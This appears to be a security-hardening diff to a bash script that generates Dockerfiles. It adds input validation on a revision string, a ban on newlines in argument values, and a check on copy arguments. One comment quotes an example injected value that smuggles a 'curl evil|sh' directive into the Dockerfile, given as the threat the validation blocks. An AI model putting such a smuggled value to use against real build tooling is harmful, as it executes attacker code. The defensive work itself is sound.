@@ -5,6 +5,14 @@ set -euo pipefail
 # If base revision was set, we are going to use given revision
 # BASE_REVISION="db70372fd4ecbc111cb195ebe249809d8f0768a3" curl -sL https://...
 BASE_REVISION="${BASE_REVISION:-main}"
+# Validate BASE_REVISION before it is interpolated into any fetch URL. Accept only
+# a git commit SHA, tag, or branch name; reject shell metacharacters and any '..'
+# sequence (curl normalizes '../' in URL paths and could be repointed at an
+# arbitrary repo/path). See SECURITY.md.
+if [[ ! "$BASE_REVISION" =~ ^[A-Za-z0-9][A-Za-z0-9._/-]*$ || "$BASE_REVISION" == *..* ]]; then
+  echo "Error: invalid BASE_REVISION '${BASE_REVISION}'. Use a commit SHA, tag, or branch name (chars [A-Za-z0-9._/-], no '..')." >&2
+  exit 1
+fi
 BASE_URL="https://raw.githubusercontent.com/orochi-network/dev-off/${BASE_REVISION}"
 
 # ============================================================================
@@ -191,6 +199,21 @@ if [[ "$TEMPLATE_OK" != true ]]; then
   exit 1
 fi
 
+# Reject control characters in any user-supplied value. Without this, a value
+# such as $'build\nRUN curl evil|sh' would inject extra directives into the
+# generated Dockerfile: the perl/$ENV{...} pass and the line-oriented emitters
+# (generate_copy_instructions, generate_runner_commands) treat an embedded
+# newline as the start of a new Dockerfile line. See SECURITY.md.
+contains_control_char() { [[ "$1" == *$'\n'* || "$1" == *$'\r'* ]]; }
+for v in "$DOCKER_COMMAND" "$BUILD_COMMAND" "$RUNNER_IMAGE" "$ENV_FILE" \
+  "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}" \
+  "${RUNNER_COMMANDS[@]+"${RUNNER_COMMANDS[@]}"}"; do
+  if contains_control_char "$v"; then
+    echo "Error: argument values may not contain newlines or carriage returns." >&2
+    exit 1
+  fi
+done
+
 # Refuse to copy credential files into any image layer (defense-in-depth against
 # leaking npm/registry tokens from the builder into the runner image). Both the
 # source and the destination name are checked, case-insensitively, so neither
@@ -202,6 +225,14 @@ is_credential_name() {
   esac
 }
 for item in "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}"; do
+  # At most one ';' may separate src from dst. More than one is ambiguous: this
+  # guard reads dst as the last field while the COPY generator reads it as the
+  # second field, so they would disagree on what is being copied. Reject it.
+  semicolons="${item//[^;]/}"
+  if [[ "${#semicolons}" -gt 1 ]]; then
+    echo "Error: -f value '${item}' contains more than one ';' (use 'src' or 'src;dst')." >&2
+    exit 1
+  fi
   src="${item%%;*}"
   dst="${item##*;}" # equals src when there is no ';'
   for name in "$src" "$dst"; do
@@ -239,6 +270,10 @@ nginx)
   RUNNER_WORKDIR="/usr/share/nginx/html"
   DOCKER_COMMAND="[\"nginx\", \"-g\", \"daemon off;\"]"
   EXPOSE_PORT=$'\nEXPOSE 80'
+  # NOTE: nginx runs as the non-root 'nginx' user (USER nginx). Binding :80 then
+  # requires the host kernel to allow it (net.ipv4.ip_unprivileged_port_start=0,
+  # the default on Docker Desktop). On a stock-kernel Linux host (threshold 1024)
+  # a non-root master cannot bind :80; switch this and configs/nginx.conf to 8080.
   # Fix permissions for non-root nginx: create cache dirs, relocate pid, disable 'user' directive
   RUNNER_COMMANDS+=("mkdir -p /var/cache/nginx/client_temp /var/cache/nginx/proxy_temp /var/cache/nginx/fastcgi_temp /var/cache/nginx/uwsgi_temp /var/cache/nginx/scgi_temp && chown -R nginx:nginx /var/cache/nginx && sed -i 's|^user  nginx;|# user  nginx;|' /etc/nginx/nginx.conf && sed -i 's|pid */run/nginx.pid;|pid /tmp/nginx.pid;|' /etc/nginx/nginx.conf")
   # For nginx, if no files specified, use default build directory
